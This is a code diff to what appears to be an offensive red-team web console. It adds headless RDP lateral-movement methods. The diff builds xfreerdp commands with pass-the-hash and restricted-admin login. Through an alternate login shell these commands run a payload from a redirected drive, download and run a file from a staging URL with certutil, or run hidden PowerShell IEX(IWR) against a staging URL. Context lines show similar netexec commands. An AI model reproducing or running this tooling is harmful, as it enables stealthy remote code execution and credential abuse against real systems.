@@ -1874,9 +1874,13 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <option value="lol-iex">wmiexec + PS IEX (fileless)</option>
                 <option value="nxe-iex">netexec + PS IEX</option>
               </optgroup>
-              <optgroup label="── RDP (requires Local Binary)">
-                <option value="rdp-drive">xfreerdp /drive mount + exec</option>
-                <option value="rdp-drive-pth">xfreerdp /pth restricted-admin + exec</option>
+              <optgroup label="── RDP /drive (requires Local Binary)">
+                <option value="rdp-drive">xvfb-run xfreerdp /drive + exec (headless)</option>
+                <option value="rdp-drive-pth">xvfb-run xfreerdp /drive + exec /pth (headless)</option>
+              </optgroup>
+              <optgroup label="── RDP LOLBin (requires Staging URL)">
+                <option value="rdp-certutil">xfreerdp + certutil download + exec (headless)</option>
+                <option value="rdp-iex">xfreerdp + PowerShell IEX (headless)</option>
               </optgroup>
             </select>
             <button class="btn btn-ghost btn-sm" id="ipc-btn-upload" onclick="ipcRun('upload')">⬆ Upload</button>
@@ -15566,23 +15570,43 @@ async function ipcRun(action) {
       cmds.push(`netexec smb ${a.target} ${a.nxe} -x 'powershell -nop -w hidden -c "IEX(IWR ''${surl}'' -UseBasicParsing)"'`);
   }
 
-  // RDP methods — mount local dir as /drive and exec from \\tsclient\
+  // RDP methods — all run under xvfb-run so no visible window appears.
   if (isRDP) {
-    if (!lbin) { toast('Select a payload', 'error'); return; }
-    const lbinBase = lbinFile.includes('/') ? lbinFile.split('/').pop() : lbinFile;
-    const lbinDir  = `$(dirname "$(realpath "payloads/${lbinFile}")")`;
     const ntHash   = a.hash.replace(/^:/, '') || a.hash;
-    const rdpCreds = (method === 'rdp-drive-pth' && ntHash)
-      ? `/pth:${ntHash} /restricted-admin`
-      : `/p:'${a.pass}'`;
-    // /shell: sets alternate shell at RDP login (no RemoteApp needed).
-    // Bash double-quote processing: \\\\→\\ and \\→\ giving \\tsclient\upload\file.exe to xfreerdp.
-    cmds.push(
-      `xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore` +
-      ` /drive:upload,${lbinDir}` +
-      ` /shell:"cmd.exe /c \\\\\\\\tsclient\\\\upload\\\\${lbinBase}"` +
-      ` /w:800 /h:600 -grab-keyboard /log-level:OFF`
-    );
+    const usePTH   = method === 'rdp-drive-pth' && ntHash;
+    const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
+    const rdpBase  = `xvfb-run -a xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
+    const rdpTail  = `/w:800 /h:600 /log-level:OFF`;
+
+    if (method === 'rdp-drive' || method === 'rdp-drive-pth') {
+      // Mount local payload dir as \\tsclient\upload\ via FUSE drive redirection.
+      // timeout /t 5 gives the virtual channel time to establish before exec.
+      // Bash double-quote: \\\\→\\ and \\→\ → \\tsclient\upload\file.exe reaches xfreerdp.
+      if (!lbin) { toast('Select a payload', 'error'); return; }
+      const lbinBase = lbinFile.includes('/') ? lbinFile.split('/').pop() : lbinFile;
+      const lbinDir  = `$(dirname "$(realpath "payloads/${lbinFile}")")`;
+      cmds.push(
+        `${rdpBase}` +
+        ` /drive:upload,${lbinDir}` +
+        ` /shell:"cmd.exe /c timeout /t 5 /nobreak > nul & \\\\\\\\tsclient\\\\upload\\\\${lbinBase}"` +
+        ` ${rdpTail}`
+      );
+    } else if (method === 'rdp-certutil') {
+      if (!surl) { toast('Enter Staging URL', 'error'); return; }
+      // Wrap /shell: value in double quotes so spaces are preserved; && is literal inside double quotes.
+      cmds.push(
+        `${rdpBase}` +
+        ` "/shell:cmd.exe /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}"` +
+        ` ${rdpTail}`
+      );
+    } else if (method === 'rdp-iex') {
+      if (!surl) { toast('Enter Staging URL', 'error'); return; }
+      cmds.push(
+        `${rdpBase}` +
+        ` "/shell:powershell -nop -w hidden -c IEX(IWR '${surl}' -UseBasicParsing)"` +
+        ` ${rdpTail}`
+      );
+    }
   }
 
   if (!cmds.length) { toast('Method not supported', 'error'); return; }
